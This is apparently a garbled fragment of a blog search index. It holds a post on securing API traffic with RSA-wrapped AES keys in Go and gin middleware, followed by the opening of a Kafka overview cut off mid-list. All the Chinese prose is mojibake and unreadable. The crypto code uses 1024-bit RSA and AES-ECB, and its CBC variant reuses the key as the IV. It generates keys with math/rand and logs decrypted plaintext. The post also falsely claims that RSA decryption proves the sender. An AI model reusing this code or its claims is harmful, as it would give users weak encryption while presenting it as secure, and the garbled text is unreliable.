å¯†è§£å¯†","url":"%2Fp%2F8ba026f1.html","content":"\nåœ¨å‰åç«¯æ•°æ®ä¼ è¾“çš„è¿‡ç¨‹ä¸­, å¦‚æœæ²¡æœ‰å¯¹æ•°æ®åŠ å¯†, æŠ“åŒ…è½¯ä»¶ç›´æ¥èƒ½çœ‹åˆ°æˆ‘è¯·æ±‚å‘çš„æ˜¯ä»€ä¹ˆæ•°æ®ï¼ŒæœåŠ¡ç«¯ç»™æˆ‘è¿”å›çš„æ•°æ®æ˜¯ä»€ä¹ˆã€‚\n\nå¹¶ä¸”å¯ä»¥ç”¨æŠ“åŒ…è½¯ä»¶ä¿®æ”¹å“åº”æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œè¿™æ ·ä¸€æ¥ï¼Œå®¢æˆ·ç«¯å®é™…ä¸Šæ¥æ”¶åˆ°çš„æ•°æ®å¹¶ä¸æ˜¯æœåŠ¡ç«¯ç»™æˆ‘çš„æºæ•°æ®ï¼Œè€Œæ˜¯è¢«ç¬¬ä¸‰è€…ä¿®æ”¹è¿‡çš„æ•°æ®ï¼Œå¦‚æ­¤ä¸€æ¥ï¼Œæ•°æ®ä¼ è¾“çš„å®‰å…¨å°±å¾ˆæœ‰å¿…è¦äº†ã€‚\n\n<!-- more -->\n\nè§£å†³æ–¹æ¡ˆå¯ä»¥ç”¨å¯¹ç§°åŠ å¯†åŠ å¯†æ•°æ®, éå¯¹ç§°åŠ å¯†åŠ å¯†key,   ä»¥å®¢æˆ·ç«¯ç»™æœåŠ¡ç«¯ä¼ è¾“æ•°æ®ä¸ºä¾‹:\n\n1. æœåŠ¡ç«¯ç”Ÿæˆä¸€å¯¹RSAç§˜é’¥ï¼Œç§é’¥æ”¾åœ¨æœåŠ¡ç«¯ï¼ˆä¸å¯æ³„éœ²ï¼‰ï¼Œå…¬é’¥ä¸‹å‘ç»™å®¢æˆ·ç«¯ã€‚\n2. å®¢æˆ·ç«¯ä½¿ç”¨éšæœºå‡½æ•°ç”Ÿæˆ keyã€‚\n3. å®¢æˆ·ç«¯ä½¿ç”¨éšæœºçš„ key å¯¹ä¼ è¾“çš„æ•°æ®ç”¨AESè¿›è¡ŒåŠ å¯†ã€‚\n4. ä½¿ç”¨æœåŠ¡ç«¯ç»™çš„å…¬é’¥å¯¹ keyè¿›è¡ŒåŠ å¯†ã€‚\n5. å®¢æˆ·ç«¯å°†ä½¿ç”¨AESåŠ å¯†çš„æ•°æ®  ä»¥åŠä½¿ç”¨ RSAå…¬é’¥åŠ å¯†çš„key  ä¸€èµ·å‘ç»™æœåŠ¡ç«¯ã€‚\n6. æœåŠ¡ç«¯æ‹¿åˆ°æ•°æ®åï¼Œå…ˆä½¿ç”¨ç§é’¥å¯¹åŠ å¯†çš„éšæœºkeyè¿›è¡Œè§£å¯†ï¼Œè§£å¯†æˆåŠŸå³å¯ç¡®å®šæ˜¯å®¢æˆ·ç«¯å‘æ¥çš„æ•°æ®ï¼Œæ²¡æœ‰ç»è¿‡ä»–äººä¿®æ”¹ï¼Œç„¶åä½¿ç”¨è§£å¯†æˆåŠŸçš„éšæœºkeyå¯¹ä½¿ç”¨AESåŠ å¯†çš„æ•°æ®è¿›è¡Œè§£å¯†ï¼Œè·å–æœ€ç»ˆçš„æ•°æ®ã€‚\n\nè¿™æ˜¯å•å‘çš„åŠ å¯†è®¤è¯, å¦‚æœè¦å®ç°åŒå‘åŠ å¯†éªŒè¯, å°±è¦ç”Ÿæˆä¸¤å¯¹å…¬é’¥å’Œç§é’¥ã€‚\n\n\n\n# 1. æ­¥éª¤\n\n### 1.1 ç”Ÿæˆrsaå¯†é’¥å¯¹\n\nç”Ÿæˆç§é’¥\n\n```bash\nopenssl genrsa -out private_client.pem 1024\nopenssl genrsa -out private_server.pem 1024\n```\n\nç”Ÿæˆå…¬é’¥\n\n```bash\nopenssl rsa -in private_client.pem -pubout -out public_client.pem\nopenssl rsa -in private_server.pem -pubout -out public_server.pem\n```\n\n\n\n### 1.2 åŠ è§£å¯†ä»£ç \n\n+ rsa.go éå¯¹ç§°åŠ å¯†\n\n```go\npackage encrypt\n\nimport (\n\t\"crypto/rand\"\n\t\"crypto/rsa\"\n\t\"crypto/sha256\"\n\t\"crypto/x509\"\n\t\"encoding/pem\"\n\t\"errors\"\n)\n\n// BytesToPrivateKey bytes to private key\nfunc BytesToPrivateKey(priv []byte) (*rsa.PrivateKey, error) {\n\tblock, _ := pem.Decode(priv)\n\tenc := x509.IsEncryptedPEMBlock(block)\n\tb := block.Bytes\n\tvar err error\n\tif enc {\n\t\tb, err = x509.DecryptPEMBlock(block, nil)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\tkey, err := x509.ParsePKCS1PrivateKey(b)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn key, nil\n}\n\n// BytesToPublicKey bytes to public key\nfunc BytesToPublicKey(pub []byte) (*rsa.PublicKey, error) {\n\tblock, _ := pem.Decode(pub)\n\tenc := x509.IsEncryptedPEMBlock(block)\n\tb := block.Bytes\n\tvar err error\n\tif enc {\n\t\tb, err = x509.DecryptPEMBlock(block, nil)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t}\n\tifc, err := x509.ParsePKIXPublicKey(b)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tkey, ok := ifc.(*rsa.PublicKey)\n\tif !ok {\n\t\treturn nil, errors.New(\"not ok\")\n\t}\n\treturn key, nil\n}\n\n// EncryptWithPublicKey encrypts data with public key\nfunc EncryptWithPublicKey(msg []byte, pub *rsa.PublicKey) ([]byte, error) {\n\thash := sha256.New()\n\tciphertext, err := rsa.EncryptOAEP(hash, rand.Reader, pub, msg, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn ciphertext, nil\n}\n\n// DecryptWithPrivateKey decrypts data with private key\nfunc DecryptWithPrivateKey(ciphertext []byte, priv *rsa.PrivateKey) ([]byte, error) {\n\thash := sha256.New()\n\tplaintext, err := rsa.DecryptOAEP(hash, rand.Reader, priv, ciphertext, nil)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\treturn plaintext, nil\n}\n```\n\n+ aes.go å¯¹ç§°åŠ å¯†\n\n  ```go\n  package encrypt\n  \n  import (\n  \t\"bytes\"\n  \t\"crypto/aes\"\n  \t\"crypto/cipher\"\n  )\n  \n  // =================== CBC ======================\n  func AesEncryptCBC(origData []byte, key []byte) (encrypted []byte) {\n  \t// åˆ†ç»„ç§˜é’¥\n  \t// NewCipherè¯¥å‡½æ•°é™åˆ¶äº†è¾“å…¥kçš„é•¿åº¦å¿…é¡»ä¸º16, 24æˆ–è€…32\n  \tblock, _ := aes.NewCipher(key)\n  \tblockSize := block.BlockSize()                              // è·å–ç§˜é’¥å—çš„é•¿åº¦\n  \torigData = pkcs5Padding(origData, blockSize)                // è¡¥å…¨ç \n  \tblockMode := cipher.NewCBCEncrypter(block, key[:blockSize]) // åŠ å¯†æ¨¡å¼\n  \tencrypted = make([]byte, len(origData))                     // åˆ›å»ºæ•°ç»„\n  \tblockMode.CryptBlocks(encrypted, origData)                  // åŠ å¯†\n  \treturn encrypted\n  }\n  func AesDecryptCBC(encrypted []byte, key []byte) (decrypted []byte) {\n  \tblock, _ := aes.NewCipher(key)                              // åˆ†ç»„ç§˜é’¥\n  \tblockSize := block.BlockSize()                              // è·å–ç§˜é’¥å—çš„é•¿åº¦\n  \tblockMode := cipher.NewCBCDecrypter(block, key[:blockSize]) // åŠ å¯†æ¨¡å¼\n  \tdecrypted = make([]byte, len(encrypted))                    // åˆ›å»ºæ•°ç»„\n  \tblockMode.CryptBlocks(decrypted, encrypted)                 // è§£å¯†\n  \tdecrypted = pkcs5UnPadding(decrypted)                       // å»é™¤è¡¥å…¨ç \n  \treturn decrypted\n  }\n  func pkcs5Padding(ciphertext []byte, blockSize int) []byte {\n  \tpadding := blockSize - len(ciphertext)%blockSize\n  \tpadtext := bytes.Repeat([]byte{byte(padding)}, padding)\n  \treturn append(ciphertext, padtext...)\n  }\n  func pkcs5UnPadding(origData []byte) []byte {\n  \tlength := len(origData)\n  \tunpadding := int(origData[length-1])\n  \treturn origData[:(length - unpadding)]\n  }\n  \n  // =================== ECB ======================\n  func AesEncryptECB(origData []byte, key []byte) (encrypted []byte) {\n  \tnewCipher, _ := aes.NewCipher(generateKey(key))\n  \tlength := (len(origData) + aes.BlockSize) / aes.BlockSize\n  \tplain := make([]byte, length*aes.BlockSize)\n  \tcopy(plain, origData)\n  \tpad := byte(len(plain) - len(origData))\n  \tfor i := len(origData); i < len(plain); i++ {\n  \t\tplain[i] = pad\n  \t}\n  \tencrypted = make([]byte, len(plain))\n  \t// åˆ†ç»„åˆ†å—åŠ å¯†\n  \tfor bs, be := 0, newCipher.BlockSize(); bs <= len(origData); bs, be = bs+newCipher.BlockSize(), be+newCipher.BlockSize() {\n  \t\tnewCipher.Encrypt(encrypted[bs:be], plain[bs:be])\n  \t}\n  \n  \treturn encrypted\n  }\n  func AesDecryptECB(encrypted []byte, key []byte) (decrypted []byte) {\n  \tnewCipher, _ := aes.NewCipher(generateKey(key))\n  \tdecrypted = make([]byte, len(encrypted))\n  \n  \tfor bs, be := 0, newCipher.BlockSize(); bs < len(encrypted); bs, be = bs+newCipher.BlockSize(), be+newCipher.BlockSize() {\n  \t\tnewCipher.Decrypt(decrypted[bs:be], encrypted[bs:be])\n  \t}\n  \n  \ttrim := 0\n  \tif len(decrypted) > 0 {\n  \t\ttrim = len(decrypted) - int(decrypted[len(decrypted)-1])\n  \t}\n  \n  \treturn decrypted[:trim]\n  }\n  func generateKey(key []byte) (genKey []byte) {\n  \tgenKey = make([]byte, 16)\n  \tcopy(genKey, key)\n  \tfor i := 16; i < len(key); {\n  \t\tfor j := 0; j < 16 && i < len(key); j, i = j+1, i+1 {\n  \t\t\tgenKey[j] ^= key[i]\n  \t\t}\n  \t}\n  \treturn genKey\n  }\n  ```\n\n  \n\n### 1.3 gin ä¸­é—´ä»¶\n\n```go\npackage middlewares\n\nimport (\n\t\"bytes\"\n\t\"encoding/base64\"\n\t\"encoding/json\"\n\t\"io/ioutil\"\n\t\"math/rand\"\n\t\"net/http\"\n\t\"public/encrypt\"\n\n\t\"github.com/gin-gonic/gin\"\n)\n\ntype EncryptParam struct {\n\tKey           string `json:\"key\" form:\"key\"`\n\tEncryptedData string `json:\"encrypted_data\" form:\"encrypted_data\"`\n}\n\ntype EncryptResponseWriter struct {\n\tgin.ResponseWriter\n\tBuff *bytes.Buffer\n}\n\nfunc (e *EncryptResponseWriter) Write(p []byte) (int, error) {\n\treturn e.Buff.Write(p)\n\t//return e.ResponseWriter.Write(p) // ä¸å†å†™åº•å±‚çš„è¿™ä¸ªwrite\n}\n\nfunc Encrypt() gin.HandlerFunc {\n\treturn func(c *gin.Context) {\n\t\tencryptType := c.Request.Header.Get(\"bb-encrypt\")\n\t\tversion := c.Request.Header.Get(\"bb-encrypt-ver\")\n\t\tif encryptType == \"\" || encryptType == \"none\" {\n\t\t\treturn\n\t\t}\n\n\t\tencryptWriter := &EncryptResponseWriter{c.Writer, bytes.NewBuffer(make([]byte, 0))}\n\t\tc.Writer = encryptWriter\n\n\t\t// è§£å¯†è¯·æ±‚\n\t\tif encryptType == \"request\" || encryptType == \"all\" {\n\n\t\t\tparam := EncryptParam{}\n\t\t\tif err := c.Bind(&param); err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"Bind EncryptParam err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tif param.Key == \"\" || param.EncryptedData == \"\" {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Error(\"EncryptedData is empty\")\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tcert, err := Dao.GetCert(version, \"server\")  // æ­¤å¤„æ˜¯ä»æ•°æ®åº“è¯»å–certs, ä¹Ÿå¯ä»¥æœ¬åœ°è¯»å–æ–‡ä»¶\n\t\t\tif err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"GetCert err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tkey, err := RsaDecryptData(cert.PrivateKey, param.Key)\n\t\t\tif err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"RsaDecryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tdata, err := AesDecryptData(key, param.EncryptedData)\n\t\t\tif err != nil {\n\t\t\t\tc.AbortWithStatus(http.StatusBadRequest)\n\t\t\t\tcommon.Log.Errorf(\"AesDecryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tif c.Request.Method == http.MethodGet {\n\t\t\t\tc.Request.URL.RawQuery = data\n\t\t\t} else {\n\t\t\t\tc.Request.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(data)))\n\t\t\t}\n\n\t\t\tcommon.Log.Infof(\"%v-middlewares-decrypt raw: %v\", c.Request.URL.Path, data)\n\t\t}\n\n\t\tc.Next()\n\n\t\tnormalReturn := func() {\n\t\t\tif _, err := encryptWriter.ResponseWriter.Write(encryptWriter.Buff.Bytes()); err != nil {\n\t\t\t\tcommon.Log.Error(err.Error())\n\t\t\t}\n\t\t}\n\t\tif encryptWriter.Status() != http.StatusOK { // ä¸æˆåŠŸ, ç›´æ¥è¿”å›\n\t\t\tnormalReturn()\n\t\t\treturn\n\t\t}\n\n\t\tencryptWriter.Header().Set(\"bb-encrypted\", version)\n\t\tencryptWriter.Header().Set(\"bb-encrypt-ver\", \"0\")\n\t\t// åŠ å¯†è¿”å›\n\t\tif encryptType == \"response\" || encryptType == \"all\" {\n\n\t\t\trandomKey := RandStringRunes(16)\n\t\t\tcert, err := Dao.GetCert(version, \"client\") // æ­¤å¤„æ˜¯ä»æ•°æ®åº“è¯»å–certs, ä¹Ÿå¯ä»¥æœ¬åœ°è¯»å–æ–‡ä»¶\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Errorf(\"GetCert err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tkey, err := RsaEncryptData(cert.PublicKey, randomKey)\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Errorf(\"RsaEncryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tencryptedData, err := AesEncryptData(randomKey, encryptWriter.Buff.String())\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Errorf(\"AesEncryptData err: %s\", err)\n\t\t\t\treturn\n\t\t\t}\n\n\t\t\tdata, err := json.Marshal(EncryptParam{Key: key, EncryptedData: encryptedData})\n\t\t\tif err != nil {\n\t\t\t\tcommon.Log.Error(err.Error())\n\t\t\t} else {\n\t\t\t\tcommon.Log.Infof(\"%v-middlewares-encrypt raw: %v\", c.Request.URL.Path, encryptWriter.Buff.String())\n\t\t\t\tencryptWriter.Header().Set(\"bb-encrypt-ver\", \"1\")\n\t\t\t\tif _, err := encryptWriter.ResponseWriter.Write(data); err != nil {\n\t\t\t\t\tcommon.Log.Error(err.Error())\n\t\t\t\t}\n\t\t\t}\n\t\t} else {\n\t\t\tnormalReturn()\n\t\t\treturn\n\t\t}\n\t}\n\n}\n\n// RSAåŠ å¯†\nfunc RsaEncryptData(publicKey, data string) (res string, err error) {\n\tpk, err := encrypt.BytesToPublicKey([]byte(publicKey))\n\tif err != nil {\n\t\treturn\n\t}\n\n\teData, err := encrypt.EncryptWithPublicKey([]byte(data), pk)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tres = base64.StdEncoding.EncodeToString(eData)\n\treturn\n}\n\n// RSAè§£å¯†\nfunc RsaDecryptData(privateKey, data string) (res string, err error) {\n\teData, err := base64.StdEncoding.DecodeString(data)\n\tif err != nil {\n\t\treturn\n\t}\n\n\tpk, err := encrypt.BytesToPrivateKey([]byte(privateKey))\n\tif err != nil {\n\t\treturn\n\t}\n\n\tcontext, err := encrypt.DecryptWithPrivateKey(eData, pk)\n\tif err != nil {\n\t\treturn\n\t}\n\tres = string(context)\n\treturn\n}\n\n// AESåŠ å¯†\nfunc AesEncryptData(key, data string) (res string, err error) {\n\teData := encrypt.AesEncryptECB([]byte(data), []byte(key))\n\tres = base64.URLEncoding.EncodeToString(eData)\n\treturn\n}\n\n// AESè§£å¯†\nfunc AesDecryptData(key, data string) (res string, err error) {\n\teData, err := base64.URLEncoding.DecodeString(data)\n\tif err != nil {\n\t\treturn\n\t}\n\tcontext := encrypt.AesDecryptECB(eData, []byte(key))\n\tres = string(context)\n\treturn\n}\n\nvar letterRunes = []rune(\"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\")\n\n// éšæœºå­—ç¬¦ä¸²\nfunc RandStringRunes(n int) string {\n\tb := make([]rune, n)\n\tfor i := range b {\n\t\tb[i] = letterRunes[rand.Intn(len(letterRunes))]\n\t}\n\treturn string(b)\n}\n```\n\n\n\n# 2. å‚è€ƒèµ„æ–™\n\n+ https://blog.csdn.net/yuzhiqiang_1993/article/details/88641265\n+ https://www.cnblogs.com/yjf512/p/10570922.html\n+ https://blog.csdn.net/mirage003/article/details/87868999","tags":["encrypt"],"categories":["4_golangå®æˆ˜"]},{"title":"kafkaåŸç†å’Œé«˜å¯ç”¨","url":"%2Fp%2F6349fed0.html","content":"\n# 1. Kafkaä»‹ç»\n\nKafkaæ˜¯LinkedInå¼€å‘å¹¶å¼€æºçš„ä¸€å¥—åˆ†å¸ƒå¼çš„é«˜æ€§èƒ½æ¶ˆæ¯å¼•æ“æœåŠ¡ï¼ŒKafkaåœ¨å¤§æ•°æ®é¢†åŸŸæ‰®æ¼”è€…ä¸¾è¶³è½»é‡çš„è§’è‰²ã€‚\n\n- æ¶ˆæ¯ç³»ç»Ÿï¼šKafkaå…·å¤‡ç³»ç»Ÿè§£è€¦ã€å†—ä½™å­˜å‚¨ã€æµé‡å‰Šå³°ã€ç¼“å†²ã€å¼‚æ­¥é€šä¿¡ã€æ‰©å±•æ€§ã€å¯æ¢å¤æ€§ç­‰å¼ºå¤§çš„åŠŸèƒ½ã€‚\n- å­˜å‚¨ç³»ç»Ÿï¼šKafka çš„æ¶ˆæ¯æŒä¹…åŒ–åŠŸèƒ½å’Œå¤šå‰¯æœ¬æœºåˆ¶ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠKafkaä½œä¸ºé•¿æœŸçš„æ•°æ®å­˜å‚¨ç³»ç»Ÿæ¥ä½¿ç”¨ã€‚\n- æµå¼å¤„ç†å¹³å°ï¼šKafkaè¿˜æä¾›äº†ä¸€ä¸ªå®Œæ•´çš„æµå¼å¤„ç†ç±»åº“ï¼Œæ¯”å¦‚çª—å£ã€è¿æ¥ã€å˜æ¢å’Œèšåˆç­‰å„ç±»æ“ä½œï¼Œä¹Ÿæ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æµå¤„ç†å¹³å°ã€‚\n\n<!-- more -->\n\n### 1.1 åŸºç¡€æ¶æ„\n\n![img](kafkaåŸç†å’Œé«˜å¯ç”¨/8d4b4a03-ddd9-4979-aa4c-86134bae4d96.png)\n\nKafka å°†æ¶ˆæ¯ä»¥ topic ä¸ºå•ä½è¿›è¡Œå½’çº³ï¼Œå‘å¸ƒæ¶ˆæ¯çš„ç¨‹åºç§°ä¸º Producerï¼Œæ¶ˆè´¹æ¶ˆæ¯çš„ç¨‹åºç§°ä¸º Consumerã€‚å®ƒæ˜¯ä»¥é›†ç¾¤çš„æ–¹å¼è¿è¡Œï¼Œå¯ä»¥ç”±ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡ç»„æˆï¼Œæ¯ä¸ªæœåŠ¡å«åšä¸€ä¸ª Brokerã€‚ \n\n### 1.2 ç»„ä»¶\n\n- Producerï¼šç”Ÿäº§è€…ï¼Œè´Ÿè´£å°†æ¶ˆæ¯å‘é€åˆ° Broker\n- Consumer ï¼šæ¶ˆè´¹è€…ï¼Œä» Broker æ¥æ”¶æ¶ˆæ¯\n- Consumer Group ï¼šæ¶ˆè´¹è€…ç»„ï¼Œç”±å¤šä¸ª Consumer ç»„æˆã€‚æ¶ˆè´¹è€…ç»„å†…æ¯ä¸ªæ¶ˆè´¹è€…è´Ÿè´£æ¶ˆè´¹ä¸åŒåˆ†åŒºçš„æ•°æ®ï¼Œä¸€ä¸ªåˆ†åŒºåªèƒ½ç”±ä¸€ä¸ªç»„å†…æ¶ˆè´¹è€…æ¶ˆè´¹ï¼Œæ¶ˆè´¹è€…ç»„ä¹‹é—´äº’ä¸å½±å“ã€‚æ‰€æœ‰çš„æ¶ˆè´¹è€…éƒ½å±äºæŸä¸ªæ¶ˆè´¹è€…ç»„ï¼Œå³æ¶ˆè´¹è€…ç»„æ˜¯é€»è¾‘ä¸Šçš„ä¸€ä¸ªè®¢é˜…è€…ã€‚\n- Broker ï¼šå¯ä»¥çœ‹åšä¸€ä¸ªç‹¬ç«‹çš„ Kafka æœåŠ¡èŠ‚ç‚¹æˆ– Kafka æœåŠ¡å®ä¾‹ã€‚å¦‚æœä¸€å°æœåŠ¡å™¨ä¸Šåªéƒ¨ç½²äº†ä¸€ä¸ª Kafka å®ä¾‹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹Ÿå¯ä»¥å°† Broker çœ‹åšä¸€å° Kafka æœåŠ¡å™¨ã€‚\n- Topic ï¼šä¸€ä¸ªé€»è¾‘ä¸Šçš„æ¦‚å¿µï¼ŒåŒ…å«å¾ˆå¤š Partitionï¼ŒåŒä¸€ä¸ª Topic ä¸‹çš„ Partiton çš„æ¶ˆæ¯å†…å®¹æ˜¯ä¸ç›¸åŒçš„ã€‚\n- Partition ï¼šä¸ºäº†å®ç°æ‰©å±•æ€§ï¼Œä¸€ä¸ªéå¸¸å¤§çš„ topic å¯ä»¥åˆ†å¸ƒåˆ°å¤šä¸ª broker ä¸Šï¼Œä¸€ä¸ª topic å¯ä»¥åˆ†ä¸ºå¤šä¸ª partitionï¼Œæ¯ä¸ª partition æ˜¯ä¸€ä¸ªæœ‰åºçš„é˜Ÿåˆ—ã€‚\n- Replica ï¼šå‰¯æœ¬ï¼ŒåŒä¸€åˆ†åŒºçš„ä¸åŒå‰¯æœ¬ä¿å­˜çš„æ˜¯ç›¸åŒçš„æ¶ˆæ¯ï¼Œä¸ºä¿è¯é›†ç¾¤ä¸­çš„æŸä¸ªèŠ‚ç‚¹å‘ç”Ÿæ•…éšœæ—¶ï¼Œè¯¥èŠ‚ç‚¹ä¸Šçš„ partition æ•°æ®ä¸ä¸¢å¤±ï¼Œä¸” kafka ä»ç„¶èƒ½å¤Ÿç»§ç»­å·¥ä½œï¼Œ- kafka æä¾›äº†å‰¯æœ¬æœºåˆ¶ï¼Œä¸€ä¸ª topic çš„æ¯ä¸ªåˆ†åŒºéƒ½æœ‰è‹¥å¹²ä¸ªå‰¯æœ¬ï¼Œä¸€ä¸ª leader å’Œè‹¥å¹²ä¸ª followerã€‚\n- Leader ï¼šæ¯ä¸ªåˆ†åŒºçš„å¤šä¸ªå‰¯æœ¬ä¸­çš„\"ä¸»å‰¯æœ¬\"ï¼Œç”Ÿäº§è€…ä»¥åŠæ¶ˆè´¹è€…åªä¸ Leader äº¤äº’ã€‚\n- Follower ï¼šæ¯ä¸ªåˆ†åŒºçš„å¤šä¸ªå‰¯æœ¬ä¸­çš„\"ä»å‰¯æœ¬\"ï¼Œè´Ÿè´£å®æ—¶ä» Leader ä¸­åŒæ­¥æ•°æ®ï¼Œä¿æŒå’Œ Leader æ•°æ®çš„åŒæ­¥ã€‚Leader å‘ç”Ÿæ•…éšœæ—¶ï¼Œä» Follower å‰¯æœ¬ä¸­é‡æ–°é€‰ä¸¾æ–°çš„ Leader å‰¯æœ¬å¯¹å¤–æä¾›æœåŠ¡ã€‚\n\n### 1.3 ä¸»é¢˜å’Œåˆ†åŒº\n\nKafka è¿˜æœ‰ä¸€ä¸ªæ¦‚å¿µå« Partitionï¼ˆåˆ†åŒºï¼‰ï¼Œåˆ†åŒºå…·ä½“åœ¨æœåŠ¡å™¨ä¸Šé¢è¡¨ç°èµ·åˆå°±æ˜¯ä¸€ä¸ªç›®å½•ã€‚ä¸€ä¸ªä¸»é¢˜ä¸‹é¢æœ‰å¤šä¸ªåˆ†åŒºï¼Œè¿™äº›åˆ†åŒºä¼šå­˜å‚¨åˆ°ä¸åŒçš„æœåŠ¡å™¨ä¸Šé¢ï¼Œæˆ–è€…è¯´ï¼Œå…¶å®å°±æ˜¯åœ¨ä¸åŒçš„ä¸»æœºä¸Šå»ºäº†ä¸åŒçš„ç›®å½•ã€‚\n\n![640?wx_fmt=png](kafkaåŸç†å’Œé«˜å¯ç”¨/jrifphk4m1.png)\n\nTopic å’Œ Partition Topic ä¹Ÿæ˜¯é€»è¾‘æ¦‚å¿µï¼Œè€Œ Partition å°±æ˜¯åˆ†å¸ƒå¼å­˜å‚¨å•å…ƒã€‚\n\näººä»¬æŠŠä¸€ä¸ªä¸»é¢˜çš„æ•°æ®çœ‹æˆä¸€ä¸ªæµï¼Œä¸ç®¡å®ƒæœ‰å¤šå°‘ä¸ªåˆ†åŒºã€‚ ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œä¸€ä¸ªæ¶ˆæ¯ä¼šè¢«å‘å¸ƒåˆ°ä¸€ä¸ªç‰¹å®šçš„ä¸»é¢˜ä¸Šã€‚ç”Ÿäº§è€…åœ¨é»˜è®¤æƒ…å†µä¸‹æŠŠæ¶ˆæ¯å‡è¡¡åœ°åˆ†å¸ƒåˆ°ä¸»é¢˜çš„æ‰€æœ‰åˆ†åŒºä¸Šï¼Œè€Œå¹¶ä¸å…³å¿ƒç‰¹å®šæ¶ˆæ¯ä¼šè¢«å†™åˆ°å“ªä¸ªåˆ†åŒºã€‚\n\nä¸è¿‡ï¼Œåœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”Ÿäº§è€…ä¼šæŠŠæ¶ˆæ¯ç›´æ¥å†™åˆ°æŒ‡å®šçš„åˆ†åŒºã€‚è¿™é€šå¸¸æ˜¯é€šè¿‡æ¶ˆæ¯é”®å’Œåˆ†åŒºå™¨æ¥å®ç°çš„ï¼Œåˆ†åŒºå™¨ä¸ºé”®ç”Ÿæˆä¸€ä¸ªæ•£åˆ—å€¼ï¼Œå¹¶å°†å…¶æ˜ å°„åˆ°æŒ‡å®šçš„åˆ†åŒºä¸Šã€‚è¿™æ ·å¯ä»¥ä¿è¯åŒ…å«åŒä¸€ä¸ªé”®çš„æ¶ˆæ¯ä¼šè¢«å†™åˆ°åŒä¸€ä¸ªåˆ†åŒºä¸Šã€‚ \n\n\n\n### 1.4 åˆ†åŒºçš„å‰¯æœ¬\n\nKafka ä¸­çš„ Partition ä¸ºäº†ä¿è¯æ•°æ®å®‰å…¨ï¼Œæ‰€ä»¥æ¯ä¸ª Partition å¯ä»¥è®¾ç½®å¤šä¸ªå‰¯æœ¬ã€‚æ­¤æ—¶æˆ‘ä»¬å¯¹åˆ†åŒº 0ï¼Œ1ï¼Œ2 åˆ†åˆ«è®¾ç½® 3 ä¸ªå‰¯æœ¬ï¼ˆå…¶å®è®¾ç½®ä¸¤ä¸ªå‰¯æœ¬æ˜¯æ¯”è¾ƒåˆé€‚çš„ï¼‰ï¼š\n\n![640?wx_fmt=png](kafkaåŸç†å’Œé«˜å¯ç”¨/zc4cj0f9pa.png)\n\nè€Œä¸”å…¶å®æ¯ä¸ªå‰¯æœ¬éƒ½æ˜¯æœ‰è§’è‰²ä¹‹åˆ†çš„ï¼Œå®ƒä»¬ä¼šé€‰å–ä¸€ä¸ªå‰¯æœ¬ä½œä¸º Leaderï¼Œè€Œå…¶ä½™çš„ä½œä¸º Followerã€‚\n\næˆ‘ä»¬çš„ç”Ÿäº§è€…åœ¨å‘é€æ•°æ®çš„æ—¶å€™ï¼Œæ˜¯ç›´æ¥å‘é€åˆ° Leader Partition é‡Œé¢ï¼Œç„¶å Follower Partition ä¼šå» Leader é‚£é‡Œè‡ªè¡ŒåŒæ­¥æ•°æ®ï¼Œæ¶ˆè´¹è€…æ¶ˆè´¹æ•°æ®çš„æ—¶å€™ï¼Œä¹Ÿæ˜¯ä» Leader é‚£å»æ¶ˆè´¹æ•°æ®çš„ã€‚\n\n![640?wx_fmt=png](kafkaåŸç†å’Œé«˜å¯ç”¨/o58y1o4bi3.png)\n\n\n\n##### 1. ISR\n\n<img src=\"kafkaåŸç†å’Œé«˜å¯ç”¨/image-20230907121322032.png\" alt=\"image-20230907121322032\" style=\"zoom:50%;\" />\n\n- AR:åˆ†åŒºä¸­çš„æ‰€æœ‰ Replica ç»Ÿç§°ä¸º AR\n- ISR:æ‰€æœ‰ä¸ Leader å‰¯æœ¬ä¿æŒä¸€å®šç¨‹åº¦åŒæ­¥çš„Replica(åŒ…æ‹¬ Leader å‰¯æœ¬åœ¨å†…)ç»„æˆ ISR\n- OSR:ä¸ Leader å‰¯æœ¬åŒæ­¥æ»åè¿‡å¤šçš„ Replica ç»„æˆäº† OSR\n\nLeader è´Ÿè´£ç»´æŠ¤å’Œè·Ÿè¸ª ISR é›†åˆä¸­æ‰€æœ‰ Follower å‰¯æœ¬çš„æ»åçŠ¶æ€ï¼Œå½“ Follower å‰¯æœ¬è½åè¿‡å¤šæ—¶ï¼Œå°±ä¼šå°†å…¶æ”¾å…¥ OSR é›†åˆï¼Œå½“ Follower å‰¯æœ¬è¿½ä¸Šäº† Leader çš„è¿›åº¦æ—¶ï¼Œå°±ä¼šå°†å…¶æ”¾å…¥ ISR 